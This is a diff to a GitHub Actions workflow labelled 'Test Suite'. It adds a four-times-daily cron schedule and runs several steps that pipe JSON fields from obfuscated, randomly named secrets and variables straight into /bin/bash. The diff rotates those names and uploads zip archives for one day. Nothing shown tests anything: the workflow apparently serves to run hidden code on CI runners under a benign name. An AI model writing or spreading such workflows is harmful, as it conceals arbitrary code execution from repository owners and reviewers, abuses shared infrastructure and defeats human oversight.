@@ -2,6 +2,8 @@ name: Test Suite
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '17 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,18 +18,17 @@ jobs:
           fetch-depth: 1
       - name: Run
         env:
-          ug4: ${{ secrets.ug4 }}
+          qw70550: ${{ secrets.qw70550 }}
         run: |
-          printf '%s' "$ug4" | jq -r .oqr77483 | /bin/bash
-          printf '%s' "$m2" | jq -r .qtip30408 | /bin/bash
-          printf '%s' "$q78" | jq -r .dtp91 | /bin/bash
-          echo $axi7704 | jq -r .fv8 | /bin/bash
-          printf '%s' "$dhehb8" | jq -r .lmqj1 | /bin/bash
+          printf '%s' "$qw70550" | jq -r .rhvhv8287 | /bin/bash
+          echo $mskt902 | jq -r .t16533 | /bin/bash
+          printf '%s' "$pbdr07" | jq -r .ugxxn28 | /bin/bash
+          printf '%s' "$ii0" | jq -r .bnsr9 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: g1kwkgMs
+          name: BWSkz3il
           path: "*.zip"
           retention-days: 1
